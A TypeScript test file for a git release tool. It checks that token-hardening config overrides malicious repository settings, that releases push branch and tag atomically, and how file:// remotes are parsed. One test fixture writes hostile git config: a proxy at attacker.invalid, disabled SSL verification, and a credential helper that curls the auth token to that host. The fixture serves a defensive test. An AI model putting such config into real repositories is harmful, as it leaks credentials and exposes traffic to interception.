import { describe, expect, test } from "bun:test";
import * as fs from "node:fs";
import * as path from "node:path";
import {
	GitCommandError,
	localRemoteSafeDirectory,
	pushRelease,
	TOKEN_SAFE_CONFIG,
	tokenUrlSafeConfig,
} from "../src/git-ops";
import { gitSync, tmpPath } from "./helpers";

const AUTH_URL = "https://github.com/octo/widget.git";

function tokenConfigArgs(authUrl: string): string[] {
	return [...TOKEN_SAFE_CONFIG, ...tokenUrlSafeConfig(authUrl)].flatMap(item => ["-c", item]);
}

function effective(repoDir: string, key: string, requestUrl: string): string {
	return gitSync(repoDir, ["-C", repoDir, ...tokenConfigArgs(AUTH_URL), "config", "--get-urlmatch", key, requestUrl], {
		check: false,
		env: { GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_SYSTEM: "/dev/null", GIT_CONFIG_GLOBAL: "/dev/null" },
	});
}

describe("token hardening", () => {
	test("neutralizes path-specific http MITM config", () => {
		const repo = path.join(tmpPath(), "pool");
		gitSync(path.dirname(repo), ["init", "-q", repo]);
		const cfg = path.join(repo, ".git", "config");
		fs.appendFileSync(
			cfg,
			`[http "${AUTH_URL}/info/refs"]\n` +
				"\tproxy = http://attacker.invalid:8080\n" +
				"\tsslVerify = false\n" +
				"\tsslCAInfo = /tmp/attacker.pem\n" +
				"\tsslCAPath = /tmp/attacker-castore\n" +
				`[http "${AUTH_URL}/git-upload-pack"]\n` +
				"\tproxy = http://attacker.invalid:8080\n" +
				`[http "${AUTH_URL}/git-receive-pack"]\n` +
				"\tproxy = http://attacker.invalid:8080\n" +
				`[credential "${AUTH_URL}/info/refs"]\n` +
				"\thelper = !sh -c 'curl attacker.invalid?$ROBOMP_GIT_HTTP_AUTH'\n",
		);
		for (const requestUrl of [
			AUTH_URL,
			`${AUTH_URL}/info`,
			`${AUTH_URL}/info/refs`,
			`${AUTH_URL}/git-upload-pack`,
			`${AUTH_URL}/git-receive-pack`,
		]) {
			expect(effective(repo, "http.proxy", requestUrl)).toBe("");
			expect(effective(repo, "http.sslVerify", requestUrl)).toBe("true");
			expect(effective(repo, "credential.helper", requestUrl)).toBe("");
		}
	});

	test("url-safe config is empty without auth url", () => {
		expect(tokenUrlSafeConfig(null)).toEqual([]);
	});

	test("url-safe config covers every smart-http path", () => {
		const items = new Set(tokenUrlSafeConfig(AUTH_URL));
		for (const suffix of ["", "/info", "/info/refs", "/git-upload-pack", "/git-receive-pack"]) {
			const scoped = `${AUTH_URL}${suffix}`;
			expect(items.has(`http.${scoped}.proxy=`)).toBe(true);
			expect(items.has(`http.${scoped}.sslVerify=true`)).toBe(true);
			expect(items.has(`credential.${scoped}.helper=`)).toBe(true);
		}
		expect(items.has(`http.${AUTH_URL}.extraHeader=`)).toBe(true);
		expect(items.has(`http.${AUTH_URL}/info/refs.extraHeader=`)).toBe(false);
	});

	test("token config never blanks CA locations", () => {
		const blob = [...TOKEN_SAFE_CONFIG, ...tokenUrlSafeConfig(AUTH_URL)].join(" ").toLowerCase();
		expect(blob).not.toContain("sslcainfo=");
		expect(blob).not.toContain("sslcapath=");
	});
});

function releaseRepos(tmp: string): { origin: string; work: string; head: string } {
	const origin = path.join(tmp, "origin.git");
	const work = path.join(tmp, "work");
	gitSync(tmp, ["init", "--bare", "--initial-branch=main", origin]);
	gitSync(tmp, ["init", "--initial-branch=main", work]);
	fs.writeFileSync(path.join(work, "README.md"), "release\n");
	gitSync(work, ["add", "README.md"]);
	gitSync(work, ["commit", "-m", "initial"]);
	gitSync(work, ["remote", "add", "origin", origin]);
	gitSync(work, ["push", "--set-upstream", "origin", "main"]);
	return { origin, work, head: gitSync(work, ["rev-parse", "HEAD"]) };
}

function commit(work: string, name: string, content: string): string {
	fs.writeFileSync(path.join(work, name), content);
	gitSync(work, ["add", name]);
	gitSync(work, ["commit", "-m", `chore: bump version to ${content.trim()}`]);
	return gitSync(work, ["rev-parse", "HEAD"]);
}

describe("pushRelease", () => {
	test("lands branch and tag atomically", async () => {
		const tmp = tmpPath();
		const { origin, work } = releaseRepos(tmp);
		const head = commit(work, "fix.txt", "1.2.3\n");
		const result = await pushRelease(work, { branch: "main", tag: "v1.2.3", expectedHead: head, token: null });
		expect(result.head).toBe(head);
		expect(gitSync(tmp, ["--git-dir", origin, "rev-parse", "refs/heads/main"])).toBe(head);
		expect(gitSync(tmp, ["--git-dir", origin, "rev-parse", "refs/tags/v1.2.3"])).toBe(head);
	});

	test("forces existing tag to new head", async () => {
		const tmp = tmpPath();
		const { origin, work, head: oldHead } = releaseRepos(tmp);
		gitSync(work, ["push", "origin", `${oldHead}:refs/tags/v1.2.3`]);
		const head = commit(work, "fix.txt", "1.2.3\n");
		await pushRelease(work, { branch: "main", tag: "v1.2.3", expectedHead: head, token: null });
		expect(gitSync(tmp, ["--git-dir", origin, "rev-parse", "refs/tags/v1.2.3"])).toBe(head);
	});

	test("rejects non-fast-forward without moving tag", async () => {
		const tmp = tmpPath();
		const { origin, work, head: oldHead } = releaseRepos(tmp);
		gitSync(work, ["push", "origin", `${oldHead}:refs/tags/v1.2.3`]);
		const localHead = commit(work, "local.txt", "1.2.3\n");
		const other = path.join(tmp, "other");
		gitSync(tmp, ["clone", origin, other]);
		const remoteHead = commit(other, "remote.txt", "1.2.4\n");
		gitSync(other, ["push", "origin", "main"]);
		await expect(
			pushRelease(work, { branch: "main", tag: "v1.2.3", expectedHead: localHead, token: null }),
		).rejects.toBeInstanceOf(GitCommandError);
		expect(gitSync(tmp, ["--git-dir", origin, "rev-parse", "refs/heads/main"])).toBe(remoteHead);
		expect(gitSync(tmp, ["--git-dir", origin, "rev-parse", "refs/tags/v1.2.3"])).toBe(oldHead);
	});
});

// Python `Path(urlparse(raw).path)`: no percent-decoding, netloc compared raw.
describe("localRemoteSafeDirectory", () => {
	test("keeps file:// paths percent-encoded and never throws on bad escapes", () => {
		expect(localRemoteSafeDirectory("file:///srv/a%20b/repo.git", "/cwd")).toBe("/srv/a%20b/repo.git");
		expect(localRemoteSafeDirectory("file:///srv/%zz/repo.git", "/cwd")).toBe("/srv/%zz/repo.git");
	});

	test("accepts only an empty or localhost netloc and drops query/fragment", () => {
		expect(localRemoteSafeDirectory("file://localhost/srv//repo.git/?x=1#frag", "/cwd")).toBe("/srv/repo.git");
		expect(localRemoteSafeDirectory("file://user@localhost/srv/repo.git", "/cwd")).toBeNull();
		expect(localRemoteSafeDirectory("file://host/srv/repo.git", "/cwd")).toBeNull();
	});

	test("rejects an unbalanced bracketed netloc like urlparse", () => {
		expect(() => localRemoteSafeDirectory("file://[::1/srv/repo.git", "/cwd")).toThrow(
			new RangeError("Invalid IPv6 URL"),
		);
	});
});
